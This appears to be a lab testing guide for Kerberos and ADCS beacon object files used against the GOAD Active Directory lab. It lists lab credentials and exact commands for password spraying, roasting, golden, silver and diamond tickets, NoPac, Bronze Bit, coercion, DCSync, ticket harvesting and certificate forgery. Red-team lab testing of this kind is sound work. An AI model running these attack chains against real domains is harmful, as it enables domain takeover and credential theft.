# GOAD BOF Testing Guide

Exact commands to test every undocumented BOF against the GOAD lab.

---

## GOAD Environment Quick Reference

| Machine | Hostname | IP | Domain |
|---------|----------|-----|--------|
| DC01 | kingslanding | 192.168.56.10 | sevenkingdoms.local |
| DC02 | winterfell | 192.168.56.11 | north.sevenkingdoms.local |
| DC03 | meereen | 192.168.56.12 | essos.local |
| SRV02 | castelblack | 192.168.56.22 | north.sevenkingdoms.local |
| SRV03 | braavos | 192.168.56.23 | essos.local |

**Defender disabled on:** castelblack (SRV02) - best initial beacon target

**Key Credentials:**

| User | Password | Domain | Role |
|------|----------|--------|------|
| eddard.stark | FightP3aceAndHonor! | north.sevenkingdoms.local | Domain Admin |
| cersei.lannister | il0vejaime | sevenkingdoms.local | Domain Admin |
| daenerys.targaryen | BurnThemAll! | essos.local | Domain Admin |
| jon.snow | iknownothing | north.sevenkingdoms.local | Constrained deleg, Kerberoastable |
| sansa.stark | 345ertdfg | north.sevenkingdoms.local | Unconstrained deleg, Kerberoastable |
| brandon.stark | iseedeadpeople | north.sevenkingdoms.local | AS-REP roastable |
| missandei | fr3edom | essos.local | AS-REP roastable |
| hodor | hodor | north.sevenkingdoms.local | Trivial password |
| stannis.baratheon | Drag0nst0ne | sevenkingdoms.local | GenericAll on kingslanding$ |
| khal.drogo | horse | essos.local | MSSQL sysadmin braavos |
| sql_svc | YouWillNotKerboroast1ngMeeeeee | north / essos | MSSQL service accounts |

**SPNs:**
- jon.snow: `HTTP/thewall.north.sevenkingdoms.local`, `CIFS/winterfell.north.sevenkingdoms.local`
- sansa.stark: `HTTP/eyrie.north.sevenkingdoms.local`
- sql_svc (north): `MSSQLSvc/castelblack.north.sevenkingdoms.local:1433`
- sql_svc (essos): `MSSQLSvc/braavos.essos.local:1433`

**ADCS:**
- ESSOS-CA on braavos (192.168.56.23) - ESC1-ESC15 templates
- YOURLYROCK-CA on kingslanding (192.168.56.10)

---

## Prerequisites

1. Get a beacon on castelblack (192.168.56.22) - Defender is disabled
2. Load the CNA: `script_load /path/to/kerbeus/kerbeus.cna`
3. For BOFs without CNA aliases, use inline-execute:
   ```
   inline-execute C:\path\to\kerbeus\bin\<bof_name>.x64.o <args>
   ```

**Note:** Commands with `krb_` prefix that are registered in kerbeus.cna can be run directly.
Commands marked with `[inline-execute]` need the full path or a custom alias.

---

## 1. Ticket Operations

### krb_asktgs - Request Service Ticket
**Has CNA alias: YES**
```
# Step 1: Get a TGT first (store the base64 output)
krb_asktgt /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local /dc:192.168.56.11

# Step 2: Use the TGT to request a service ticket
krb_asktgs /service:CIFS/winterfell.north.sevenkingdoms.local /domain:north.sevenkingdoms.local /dc:192.168.56.11

# With explicit ticket
krb_asktgs /service:CIFS/winterfell.north.sevenkingdoms.local /ticket:<BASE64_TGT_FROM_STEP1> /dc:192.168.56.11

# Request multiple service tickets at once
krb_asktgs /service:CIFS/winterfell.north.sevenkingdoms.local,LDAP/winterfell.north.sevenkingdoms.local /dc:192.168.56.11

# Request and import
krb_asktgs /service:CIFS/winterfell.north.sevenkingdoms.local /dc:192.168.56.11 /ptt
```
**Expected output:** Base64-encoded TGS ticket, service name, encryption type

---

### krb_asktgtrc4 - Request TGT with RC4/NTLM Hash
**Has CNA alias: NO - use inline-execute**
```
# First get the RC4 hash for a user
krb_hash /password:iknownothing /user:jon.snow /domain:north.sevenkingdoms.local
# Note the RC4/NTLM hash from output

# Then request TGT with the hash (overpass-the-hash)
inline-execute C:\tools\kerbeus\bin\krb_asktgtrc4.x64.o /user:jon.snow /rc4:<NTLM_HASH> /domain:north.sevenkingdoms.local /dc:192.168.56.11

# With pass-the-ticket
inline-execute C:\tools\kerbeus\bin\krb_asktgtrc4.x64.o /user:eddard.stark /rc4:<DA_NTLM_HASH> /domain:north.sevenkingdoms.local /dc:192.168.56.11 /ptt
```
**Expected output:** Base64-encoded TGT obtained via RC4 key

---

### krb_ptt - Pass The Ticket
**Has CNA alias: YES**
```
# Get a TGT first
krb_asktgt /user:eddard.stark /password:FightP3aceAndHonor! /domain:north.sevenkingdoms.local /dc:192.168.56.11
# Copy the base64 ticket from output

# Import the ticket into current session
krb_ptt /ticket:<BASE64_TGT>

# Verify it was imported
krb_klist
```
**Expected output:** Confirmation that ticket was submitted to the logon session

---

### krb_tgtdeleg - TGT Delegation Trick
**Has CNA alias: YES**
```
# Extract usable TGT without elevation (Kerberos GSS-API trick)
# Must be running as a domain user with a cached TGT
krb_tgtdeleg

# Target a specific SPN for the delegation
krb_tgtdeleg /target:CIFS/winterfell.north.sevenkingdoms.local
```
**Expected output:** Base64-encoded TGT extracted via delegation trick (RC4 encrypted, usable for pass-the-ticket)

---

### krb_renew - Renew TGT
**Has CNA alias: YES**
```
# Get a TGT first
krb_asktgt /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local /dc:192.168.56.11
# Copy the base64 ticket

# Renew it
krb_renew /ticket:<BASE64_TGT> /dc:192.168.56.11

# Renew and import
krb_renew /ticket:<BASE64_TGT> /dc:192.168.56.11 /ptt
```
**Expected output:** Renewed TGT with extended lifetime

---

### krb_kirbi - Convert to/from .kirbi Format
**Has CNA alias: NO - use inline-execute**
```
# Convert a base64 ticket to kirbi description/analysis
inline-execute C:\tools\kerbeus\bin\krb_kirbi.x64.o /ticket:<BASE64_TICKET>

# If it supports file output:
inline-execute C:\tools\kerbeus\bin\krb_kirbi.x64.o /ticket:<BASE64_TICKET> /outfile:C:\temp\ticket.kirbi
```
**Expected output:** .kirbi format ticket data or conversion confirmation

---

### krb_ccache - Convert to/from ccache Format
**Has CNA alias: NO - use inline-execute**
```
# Convert base64 ticket to ccache format (for use with Linux tools)
inline-execute C:\tools\kerbeus\bin\krb_ccache.x64.o /ticket:<BASE64_TICKET>

# If it supports file output:
inline-execute C:\tools\kerbeus\bin\krb_ccache.x64.o /ticket:<BASE64_TICKET> /outfile:C:\temp\krb5cc_ticket
```
**Expected output:** ccache-format ticket (compatible with impacket, etc.)

---

### krb_asrep2kirbi - Convert AS-REP to .kirbi
**Has CNA alias: NO - use inline-execute**
```
# First get an AS-REP (from AS-REP roasting)
krb_asreproasting /user:brandon.stark /domain:north.sevenkingdoms.local /dc:192.168.56.11
# Copy the raw AS-REP base64 blob

# Convert AS-REP to usable kirbi ticket
inline-execute C:\tools\kerbeus\bin\krb_asrep2kirbi.x64.o /asrep:<BASE64_ASREP>
```
**Expected output:** Converted .kirbi ticket from raw AS-REP data

---

### krb_tgssub - TGS Ticket Service Name Substitution
**Has CNA alias: NO - use inline-execute**
```
# Get a service ticket for one SPN
krb_asktgs /service:HTTP/eyrie.north.sevenkingdoms.local /dc:192.168.56.11
# Copy the base64 TGS

# Substitute the service name in the ticket (rewrite sname field)
inline-execute C:\tools\kerbeus\bin\krb_tgssub.x64.o /ticket:<BASE64_TGS> /altservice:CIFS/winterfell.north.sevenkingdoms.local

# Substitute and import
inline-execute C:\tools\kerbeus\bin\krb_tgssub.x64.o /ticket:<BASE64_TGS> /altservice:LDAP/winterfell.north.sevenkingdoms.local /ptt
```
**Expected output:** Modified TGS with substituted service name (useful for silver ticket / S4U abuse)

---

## 2. Roasting & Credential Attacks

### krb_asreproasting - AS-REP Roasting (Manual)
**Has CNA alias: YES (via autoroast CNA)**
```
# AS-REP roast brandon.stark (DONT_REQUIRE_PREAUTH)
krb_asreproasting /user:brandon.stark /domain:north.sevenkingdoms.local /dc:192.168.56.11

# AS-REP roast missandei
krb_asreproasting /user:missandei /domain:essos.local /dc:192.168.56.12

# Crack with hashcat
# hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```
**Expected output:** `$krb5asrep$23$` hash in hashcat format

---

### krb_preauthscan - Pre-Auth Scan
**Has CNA alias: NO - use inline-execute**
```
# Check if brandon.stark has pre-auth disabled
inline-execute C:\tools\kerbeus\bin\krb_preauthscan.x64.o /user:brandon.stark /domain:north.sevenkingdoms.local /dc:192.168.56.11

# Check missandei
inline-execute C:\tools\kerbeus\bin\krb_preauthscan.x64.o /user:missandei /domain:essos.local /dc:192.168.56.12

# Check a user that DOES require preauth (should show enabled)
inline-execute C:\tools\kerbeus\bin\krb_preauthscan.x64.o /user:jon.snow /domain:north.sevenkingdoms.local /dc:192.168.56.11

# Scan multiple users if supported
inline-execute C:\tools\kerbeus\bin\krb_preauthscan.x64.o /users:brandon.stark,hodor,jon.snow,arya.stark /domain:north.sevenkingdoms.local /dc:192.168.56.11
```
**Expected output:** Whether DONT_REQUIRE_PREAUTH is set for each user

---

### krb_brute - Kerberos Brute Force
**Has CNA alias: YES**
```
# Password spray: try one password against multiple users
krb_brute /user:hodor /password:hodor /domain:north.sevenkingdoms.local /dc:192.168.56.11

# Try common passwords against a known user
krb_brute /user:rickon.stark /password:Winter2022 /domain:north.sevenkingdoms.local /dc:192.168.56.11

# Test trivial password (user=password)
krb_brute /user:hodor /password:hodor /domain:north.sevenkingdoms.local /dc:192.168.56.11
```
**Expected output:** Valid/invalid credential confirmation via Kerberos pre-auth response codes

---

### krb_spray - Password Spray
**Has CNA alias: NO - use inline-execute**
```
# Spray a common password across the north domain
inline-execute C:\tools\kerbeus\bin\krb_spray.x64.o /password:Winter2022 /domain:north.sevenkingdoms.local /dc:192.168.56.11

# Spray with specific users
inline-execute C:\tools\kerbeus\bin\krb_spray.x64.o /users:hodor,rickon.stark,brandon.stark,arya.stark /password:hodor /domain:north.sevenkingdoms.local /dc:192.168.56.11
```
**Expected output:** List of accounts where the password is valid

---

## 3. Ticket Forging

### krb_golden - Golden Ticket
**Has CNA alias: YES**

**Prerequisite:** You need the krbtgt hash. Get it via DCSync or from a compromised DC.
```
# Step 1: DCSync to get krbtgt hash (need DA privs)
# Use mimikatz or krb_dcsync to get:
#   - Domain SID: S-1-5-21-... (get from whoami /all or BloodHound)
#   - krbtgt RC4/NTLM hash

# Step 2: Forge golden ticket for north.sevenkingdoms.local
krb_golden /user:Administrator /domain:north.sevenkingdoms.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /ptt

# Forge for a non-existent user (demonstrates ticket forging)
krb_golden /user:fakeadmin /domain:north.sevenkingdoms.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /id:500 /groups:512,513,518,519,520 /ptt

# Cross-domain golden ticket (child -> parent escalation)
# north.sevenkingdoms.local -> sevenkingdoms.local
# Need: child krbtgt hash + parent domain SID for Enterprise Admins SID injection
krb_golden /user:Administrator /domain:north.sevenkingdoms.local /sid:<CHILD_DOMAIN_SID> /krbtgt:<CHILD_KRBTGT_HASH> /sids:<PARENT_SID>-519 /ptt
```
**Expected output:** Forged TGT in base64 format, optionally imported to session

---

### krb_silver - Silver Ticket
**Has CNA alias: YES**

**Prerequisite:** You need the target service account's NTLM hash.
```
# Forge a CIFS silver ticket to access winterfell (the DC)
# Need: service account hash (computer account or service user hash)
krb_silver /user:Administrator /domain:north.sevenkingdoms.local /sid:<DOMAIN_SID> /service:CIFS/winterfell.north.sevenkingdoms.local /rc4:<WINTERFELL_MACHINE_HASH> /ptt

# Forge LDAP silver ticket (for DCSync without DA)
krb_silver /user:Administrator /domain:north.sevenkingdoms.local /sid:<DOMAIN_SID> /service:LDAP/winterfell.north.sevenkingdoms.local /rc4:<WINTERFELL_MACHINE_HASH> /ptt

# Forge HTTP silver ticket for web service
krb_silver /user:Administrator /domain:north.sevenkingdoms.local /sid:<DOMAIN_SID> /service:HTTP/castelblack.north.sevenkingdoms.local /rc4:<CASTELBLACK_MACHINE_HASH> /ptt
```
**Expected output:** Forged TGS in base64 format

---

### krb_diamond - Diamond Ticket
**Has CNA alias: YES**

**Prerequisite:** You need the krbtgt AES256 key (more OPSEC-safe than golden ticket).
```
# Step 1: Get a legitimate TGT
krb_asktgt /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local /dc:192.168.56.11
# Save the base64 TGT

# Step 2: Modify the PAC in the legitimate TGT to grant DA privileges
krb_diamond /ticket:<BASE64_TGT> /krbkey:<KRBTGT_AES256_KEY> /targetuser:Administrator /groups:512,513,518,519,520 /ptt

# Or request + modify in one step
krb_diamond /user:jon.snow /password:iknownothing /krbkey:<KRBTGT_AES256_KEY> /domain:north.sevenkingdoms.local /dc:192.168.56.11 /ptt
```
**Expected output:** Modified TGT with elevated PAC, stealthier than golden ticket since it starts from a real AS-REQ

---

### krb_nopac - NoPac / sAMAccountName Spoofing (CVE-2021-42287)
**Has CNA alias: NO - use inline-execute**
```
# Exploit sAMAccountName impersonation to get a TGT for the DC
# This renames a machine account to match the DC, requests a TGT, then renames it back

# Using a regular domain user credential
inline-execute C:\tools\kerbeus\bin\krb_nopac.x64.o /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local /dc:192.168.56.11 /target:winterfell.north.sevenkingdoms.local

# With hash
inline-execute C:\tools\kerbeus\bin\krb_nopac.x64.o /user:hodor /password:hodor /domain:north.sevenkingdoms.local /dc:192.168.56.11 /target:winterfell.north.sevenkingdoms.local /ptt
```
**Expected output:** TGT for the DC machine account, enabling DCSync

---

## 4. Delegation Attacks

### krb_s4u - S4U2Self / S4U2Proxy
**Has CNA alias: YES**

**Target:** jon.snow has constrained delegation to `CIFS/winterfell.north.sevenkingdoms.local`
```
# Step 1: Get jon.snow's TGT
krb_asktgt /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local /dc:192.168.56.11
# Save the base64 TGT

# Step 2: S4U2Self - Get a ticket for administrator TO jon.snow's SPN
# Step 3: S4U2Proxy - Forward that ticket to CIFS/winterfell (the constrained delegation target)
krb_s4u /ticket:<JON_SNOW_TGT> /impersonateuser:Administrator /service:CIFS/winterfell.north.sevenkingdoms.local /domain:north.sevenkingdoms.local /dc:192.168.56.11 /ptt

# After importing, access the DC file system
# shell dir \\winterfell.north.sevenkingdoms.local\C$

# S4U with alternative service (if you can alter the service name)
krb_s4u /ticket:<JON_SNOW_TGT> /impersonateuser:Administrator /service:CIFS/winterfell.north.sevenkingdoms.local /altservice:LDAP /domain:north.sevenkingdoms.local /dc:192.168.56.11 /ptt
```
**Expected output:** Impersonated service ticket for administrator to CIFS/winterfell - enables DC access

---

### krb_rbcd - Resource-Based Constrained Delegation
**Has CNA alias: NO - use inline-execute**

**Target:** stannis.baratheon has GenericAll on kingslanding$ - can write msDS-AllowedToActOnBehalfOfOtherIdentity
```
# Step 1: Create a new machine account (or use an existing one you control)
# You may need addcomputer.py from impacket or a separate BOF for this

# Step 2: Configure RBCD - set the target to allow your machine account to delegate
inline-execute C:\tools\kerbeus\bin\krb_rbcd.x64.o /target:kingslanding$ /sid:<YOUR_MACHINE_ACCOUNT_SID> /domain:sevenkingdoms.local /dc:192.168.56.10

# Or specify by account name
inline-execute C:\tools\kerbeus\bin\krb_rbcd.x64.o /target:kingslanding$ /delegatefrom:YOURCOMPUTER$ /domain:sevenkingdoms.local /dc:192.168.56.10

# Step 3: Then use S4U to impersonate admin to the target
# krb_s4u /ticket:<YOUR_MACHINE_TGT> /impersonateuser:Administrator /service:CIFS/kingslanding.sevenkingdoms.local /ptt

# Read current RBCD configuration
inline-execute C:\tools\kerbeus\bin\krb_rbcd.x64.o /target:kingslanding$ /read /domain:sevenkingdoms.local /dc:192.168.56.10

# Clean up - remove RBCD
inline-execute C:\tools\kerbeus\bin\krb_rbcd.x64.o /target:kingslanding$ /clear /domain:sevenkingdoms.local /dc:192.168.56.10
```
**Expected output:** Confirmation that msDS-AllowedToActOnBehalfOfOtherIdentity was written

---

### krb_bronzebit - Bronze Bit Attack (CVE-2020-17049)
**Has CNA alias: NO - use inline-execute**

**Target:** castelblack$ has constrained delegation (without protocol transition) to `HTTP/winterfell`
```
# Bronze Bit flips the forwardable flag in an S4U2Self ticket
# This bypasses "constrained delegation without protocol transition" restrictions

# Step 1: Get the castelblack$ machine account TGT (need its hash from DCSync/LSASS)
krb_asktgt /user:castelblack$ /rc4:<CASTELBLACK_MACHINE_HASH> /domain:north.sevenkingdoms.local /dc:192.168.56.11

# Step 2: Use bronze bit to forge a forwardable S4U2Self ticket
inline-execute C:\tools\kerbeus\bin\krb_bronzebit.x64.o /ticket:<CASTELBLACK_TGT> /impersonateuser:Administrator /service:HTTP/winterfell.north.sevenkingdoms.local /domain:north.sevenkingdoms.local /dc:192.168.56.11 /bronzebit /ptt

# This should work even though castelblack$ doesn't have protocol transition enabled
```
**Expected output:** Forwardable S4U2Proxy ticket despite no protocol transition (CVE-2020-17049)

---

### krb_delegenum - Enumerate Delegation Configurations
**Has CNA alias: NO - use inline-execute**
```
# Enumerate all delegation in north domain
inline-execute C:\tools\kerbeus\bin\krb_delegenum.x64.o /domain:north.sevenkingdoms.local /dc:192.168.56.11

# Enumerate delegation in sevenkingdoms
inline-execute C:\tools\kerbeus\bin\krb_delegenum.x64.o /domain:sevenkingdoms.local /dc:192.168.56.10

# Enumerate delegation in essos
inline-execute C:\tools\kerbeus\bin\krb_delegenum.x64.o /domain:essos.local /dc:192.168.56.12
```
**Expected output:** Lists of accounts with:
- Unconstrained delegation (sansa.stark, DCs)
- Constrained delegation (jon.snow -> CIFS/winterfell, castelblack$ -> HTTP/winterfell)
- RBCD configurations

---

### krb_unconstrained_enum - Enumerate Unconstrained Delegation Hosts
**Has CNA alias: NO - use inline-execute**
```
# Find all hosts/users with unconstrained delegation
inline-execute C:\tools\kerbeus\bin\krb_unconstrained_enum.x64.o /domain:north.sevenkingdoms.local /dc:192.168.56.11

inline-execute C:\tools\kerbeus\bin\krb_unconstrained_enum.x64.o /domain:sevenkingdoms.local /dc:192.168.56.10

inline-execute C:\tools\kerbeus\bin\krb_unconstrained_enum.x64.o /domain:essos.local /dc:192.168.56.12
```
**Expected output:** sansa.stark (user) + all DCs (machine accounts with TRUSTED_FOR_DELEGATION)

---

## 5. Coercion & Lateral Movement

### krb_printerbug - SpoolService / PrinterBug Coercion
**Has CNA alias: NO - use inline-execute**

**Use case:** Force a DC to authenticate to a host with unconstrained delegation (sansa.stark's session)
```
# Force winterfell (DC02) to authenticate to castelblack (where you have a beacon)
inline-execute C:\tools\kerbeus\bin\krb_printerbug.x64.o /target:winterfell.north.sevenkingdoms.local /captureserver:castelblack.north.sevenkingdoms.local

# Force kingslanding (DC01) to authenticate to castelblack
inline-execute C:\tools\kerbeus\bin\krb_printerbug.x64.o /target:kingslanding.sevenkingdoms.local /captureserver:castelblack.north.sevenkingdoms.local

# Force meereen (DC03) to authenticate
inline-execute C:\tools\kerbeus\bin\krb_printerbug.x64.o /target:meereen.essos.local /captureserver:castelblack.north.sevenkingdoms.local
```
**Expected output:** The target DC's machine account authenticates to your capture server. Combine with krb_unconstrained monitor to capture the TGT.

**Full attack chain:**
```
# 1. Start monitoring for TGTs on the unconstrained delegation host
krb_monitor /interval:5 /count:20

# 2. Trigger the printerbug from another beacon/process
inline-execute C:\tools\kerbeus\bin\krb_printerbug.x64.o /target:winterfell.north.sevenkingdoms.local /captureserver:castelblack.north.sevenkingdoms.local

# 3. Check monitor output - should capture winterfell$ TGT
# 4. Use the captured TGT for DCSync
```

---

### krb_petitpotam - PetitPotam Coercion (EFSRPC)
**Has CNA alias: NO - use inline-execute**
```
# Force winterfell to authenticate via EFS RPC
inline-execute C:\tools\kerbeus\bin\krb_petitpotam.x64.o /target:winterfell.north.sevenkingdoms.local /captureserver:castelblack.north.sevenkingdoms.local

# Force kingslanding
inline-execute C:\tools\kerbeus\bin\krb_petitpotam.x64.o /target:kingslanding.sevenkingdoms.local /captureserver:castelblack.north.sevenkingdoms.local

# Force meereen
inline-execute C:\tools\kerbeus\bin\krb_petitpotam.x64.o /target:meereen.essos.local /captureserver:castelblack.north.sevenkingdoms.local
```
**Expected output:** Target authenticates to capture server via NTLM. Use for relay to ADCS (ESC8) or capture with unconstrained delegation.

---

### krb_dcsync - DCSync Attack
**Has CNA alias: NO - use inline-execute**

**Prerequisite:** Need DA privileges or Replicating Directory Changes rights
```
# DCSync the krbtgt hash from north domain (need eddard.stark context or DA TGT imported)
inline-execute C:\tools\kerbeus\bin\krb_dcsync.x64.o /user:krbtgt /domain:north.sevenkingdoms.local /dc:192.168.56.11

# DCSync the Administrator hash
inline-execute C:\tools\kerbeus\bin\krb_dcsync.x64.o /user:Administrator /domain:north.sevenkingdoms.local /dc:192.168.56.11

# DCSync eddard.stark
inline-execute C:\tools\kerbeus\bin\krb_dcsync.x64.o /user:eddard.stark /domain:north.sevenkingdoms.local /dc:192.168.56.11

# DCSync from sevenkingdoms (need cersei.lannister context)
inline-execute C:\tools\kerbeus\bin\krb_dcsync.x64.o /user:krbtgt /domain:sevenkingdoms.local /dc:192.168.56.10

# DCSync all users (if supported)
inline-execute C:\tools\kerbeus\bin\krb_dcsync.x64.o /all /domain:north.sevenkingdoms.local /dc:192.168.56.11
```
**Expected output:** NTLM hash, AES128 key, AES256 key for the target user

---

### krb_crossdomain - Cross-Domain Ticket Operations
**Has CNA alias: NO - use inline-execute**
```
# Request a cross-domain referral ticket (north -> sevenkingdoms parent)
inline-execute C:\tools\kerbeus\bin\krb_crossdomain.x64.o /domain:north.sevenkingdoms.local /targetdomain:sevenkingdoms.local /dc:192.168.56.11

# Cross-forest ticket (sevenkingdoms -> essos)
inline-execute C:\tools\kerbeus\bin\krb_crossdomain.x64.o /domain:sevenkingdoms.local /targetdomain:essos.local /dc:192.168.56.10

# With a specific ticket
inline-execute C:\tools\kerbeus\bin\krb_crossdomain.x64.o /ticket:<BASE64_TGT> /targetdomain:sevenkingdoms.local
```
**Expected output:** Inter-realm referral TGT for accessing resources in the target domain

---

### krb_u2u - User-to-User Authentication
**Has CNA alias: NO - use inline-execute**
```
# User-to-User Kerberos authentication - request service ticket encrypted with target user's TGT session key
# Useful for accessing users who don't have an SPN

# Request U2U ticket for a user
inline-execute C:\tools\kerbeus\bin\krb_u2u.x64.o /targetuser:eddard.stark /domain:north.sevenkingdoms.local /dc:192.168.56.11

# With explicit tickets
inline-execute C:\tools\kerbeus\bin\krb_u2u.x64.o /ticket:<YOUR_TGT> /tgs:<TARGET_TGT> /targetuser:eddard.stark
```
**Expected output:** U2U encrypted service ticket (encrypted with target's TGT session key)

---

## 6. Session & Process Management

### krb_createnetonly - Create Process with Network Logon
**Has CNA alias: YES**
```
# Create a sacrificial process for ticket injection (hidden window)
krb_createnetonly /program:C:\Windows\System32\cmd.exe

# Create with visible window (for debugging)
krb_createnetonly /program:C:\Windows\System32\cmd.exe /show

# Create process and immediately inject a ticket
krb_createnetonly /program:C:\Windows\System32\cmd.exe /ticket:<BASE64_TGT>

# Common pattern: create netonly + inject DA ticket
# Step 1: Get DA TGT
krb_asktgt /user:eddard.stark /password:FightP3aceAndHonor! /domain:north.sevenkingdoms.local /dc:192.168.56.11
# Step 2: Create new logon session with that ticket
krb_createnetonly /program:C:\Windows\System32\cmd.exe /ticket:<DA_TGT>
# Step 3: Steal token from the new process or inject beacon
```
**Expected output:** New process PID and LUID, ticket injected into its logon session

---

### krb_monitor - Monitor for New TGTs
**Has CNA alias: YES**
```
# Monitor for new TGTs every 5 seconds, 20 iterations
krb_monitor /interval:5 /count:20

# Monitor for a specific user's TGT
krb_monitor /interval:5 /count:30 /targetuser:eddard.stark

# Quick check (1 iteration)
krb_monitor /count:1
```
**Expected output:** Newly appearing TGTs in logon sessions (useful during unconstrained delegation attacks)

---

### krb_harvest - Harvest All TGTs
**Has CNA alias: YES**
```
# One-shot harvest of all TGTs from all logon sessions (requires elevation)
krb_harvest

# Continuous harvest with interval
krb_harvest /interval:30

# Harvest without base64 output (just show info)
krb_harvest /nowrap
```
**Expected output:** All TGTs from all logon sessions with base64-encoded ticket data

---

## 7. Credential & Account Manipulation

### krb_changepw - Change User Password via Kerberos
**Has CNA alias: YES**
```
# Step 1: Get a TGT for the user whose password you want to change
krb_asktgt /user:hodor /password:hodor /domain:north.sevenkingdoms.local /dc:192.168.56.11
# Copy the base64 TGT

# Step 2: Change the password using the TGT
krb_changepw /ticket:<HODOR_TGT> /new:NewPassword123! /dc:192.168.56.11

# Change another user's password (requires appropriate privileges - e.g. ForceChangePassword ACE)
# tywin.lannister has ForceChangePassword on jaime.lannister
krb_asktgt /user:tywin.lannister /password:powerkingftw135 /domain:sevenkingdoms.local /dc:192.168.56.10
krb_changepw /ticket:<TYWIN_TGT> /new:Compromised1! /targetuser:jaime.lannister /targetdomain:sevenkingdoms.local /dc:192.168.56.10
```
**Expected output:** Password change confirmation or error

**WARNING:** This modifies AD objects. Consider using krb_resetpw instead if you want to be able to restore.

---

### krb_resetpw - Reset User Password via Kerberos
**Has CNA alias: NO - use inline-execute**
```
# Reset a user's password (requires appropriate privileges)
# tywin.lannister -> ForceChangePassword on jaime.lannister
inline-execute C:\tools\kerbeus\bin\krb_resetpw.x64.o /user:jaime.lannister /new:ResetPass1! /domain:sevenkingdoms.local /dc:192.168.56.10

# Using a ticket
inline-execute C:\tools\kerbeus\bin\krb_resetpw.x64.o /ticket:<TYWIN_TGT> /targetuser:jaime.lannister /new:ResetPass1! /dc:192.168.56.10
```
**Expected output:** Password reset confirmation

---

## 8. Enumeration & Recon

### krb_showall - Show All Kerberos Info
**Has CNA alias: NO - use inline-execute**
```
# Show comprehensive Kerberos information for the current environment
inline-execute C:\tools\kerbeus\bin\krb_showall.x64.o

# For a specific domain
inline-execute C:\tools\kerbeus\bin\krb_showall.x64.o /domain:north.sevenkingdoms.local /dc:192.168.56.11
```
**Expected output:** Combined output of klist + triage + session info

---

### krb_anonldap - Anonymous LDAP Enumeration
**Has CNA alias: NO - use inline-execute**

**Target:** winterfell (192.168.56.11) has anonymous LDAP enabled
```
# Anonymous LDAP bind to enumerate users
inline-execute C:\tools\kerbeus\bin\krb_anonldap.x64.o /dc:192.168.56.11

# Enumerate specific domain
inline-execute C:\tools\kerbeus\bin\krb_anonldap.x64.o /dc:192.168.56.11 /domain:north.sevenkingdoms.local

# Try against meereen (may or may not allow anonymous)
inline-execute C:\tools\kerbeus\bin\krb_anonldap.x64.o /dc:192.168.56.12

# Try against kingslanding
inline-execute C:\tools\kerbeus\bin\krb_anonldap.x64.o /dc:192.168.56.10
```
**Expected output:** User list, computer accounts, domain info obtained without credentials

---

### krb_stats - Kerberos Statistics
**Has CNA alias: NO - use inline-execute**
```
# Get Kerberos statistics/info for the current environment
inline-execute C:\tools\kerbeus\bin\krb_stats.x64.o

# For a specific domain
inline-execute C:\tools\kerbeus\bin\krb_stats.x64.o /domain:north.sevenkingdoms.local /dc:192.168.56.11
```
**Expected output:** Domain info, KDC version, supported encryption types, realm details

---

### krb_pac - PAC Inspection
**Has CNA alias: NO - use inline-execute**
```
# Inspect PAC in a ticket (shows group memberships, privileges)
# First get a TGT
krb_asktgt /user:eddard.stark /password:FightP3aceAndHonor! /domain:north.sevenkingdoms.local /dc:192.168.56.11

# Decode the PAC
inline-execute C:\tools\kerbeus\bin\krb_pac.x64.o /ticket:<BASE64_TGT>

# Inspect a regular user's PAC
krb_asktgt /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local /dc:192.168.56.11
inline-execute C:\tools\kerbeus\bin\krb_pac.x64.o /ticket:<JON_TGT>
```
**Expected output:** Decoded PAC info including user RID, group RIDs, logon info, signature types

---

## 9. Misc / Advanced

### krb_opsec - OPSEC-Safe Operations
**Has CNA alias: NO - use inline-execute**
```
# OPSEC-safe ticket request (AES encryption, avoids RC4 downgrade detection)
inline-execute C:\tools\kerbeus\bin\krb_opsec.x64.o /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local /dc:192.168.56.11

# OPSEC mode may also set proper encryption types to avoid detection
inline-execute C:\tools\kerbeus\bin\krb_opsec.x64.o /user:eddard.stark /password:FightP3aceAndHonor! /domain:north.sevenkingdoms.local /dc:192.168.56.11 /enctype:aes256
```
**Expected output:** Ticket operations with AES256 encryption (avoids Event ID 4769 with RC4 downgrade)

---

### krb_kdcproxy - KDC Proxy (Kerberos over HTTPS)
**Has CNA alias: NO - use inline-execute**
```
# Route Kerberos traffic through a KDC proxy (HTTPS tunnel)
# Useful when UDP/TCP 88 is blocked but HTTPS is available
inline-execute C:\tools\kerbeus\bin\krb_kdcproxy.x64.o /proxyurl:https://kingslanding.sevenkingdoms.local/KdcProxy /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local

# Note: GOAD may not have KDC Proxy configured. This tests the BOF functionality.
# If KDC Proxy is not set up, expect a connection error (which still validates the BOF loads/runs).
```
**Expected output:** TGT obtained via HTTPS KDC Proxy, or connection error if proxy not configured

---

## 10. Certify BOFs

### cert_download - Download Certificate
**Has CNA alias: NO - use inline-execute**
```
# Download a certificate from the CA by request ID
# First request a cert with cert_request, note the request ID
inline-execute C:\tools\certify\bin\cert_download.x64.o /ca:braavos.essos.local\ESSOS-CA /id:<REQUEST_ID>

# Download to file
inline-execute C:\tools\certify\bin\cert_download.x64.o /ca:braavos.essos.local\ESSOS-CA /id:<REQUEST_ID> /outfile:C:\temp\cert.pem
```
**Expected output:** Base64-encoded certificate or PEM file

---

### cert_forge - Golden Certificate / Certificate Forgery
**Has CNA alias: NO - use inline-execute**

**Prerequisite:** Need the CA certificate and private key (obtained via ESC7 ManageCA abuse or CA backup)
```
# Forge a certificate for administrator
# Step 1: Obtain CA cert + private key (from compromised CA)
# Step 2: Forge
inline-execute C:\tools\certify\bin\cert_forge.x64.o /ca:C:\temp\ca.pfx /capassword:password /subject:CN=Administrator,CN=Users,DC=essos,DC=local /altname:administrator@essos.local

# Forge for a specific user in north domain
inline-execute C:\tools\certify\bin\cert_forge.x64.o /ca:C:\temp\ca.pfx /capassword:password /subject:CN=eddard.stark /altname:eddard.stark@north.sevenkingdoms.local
```
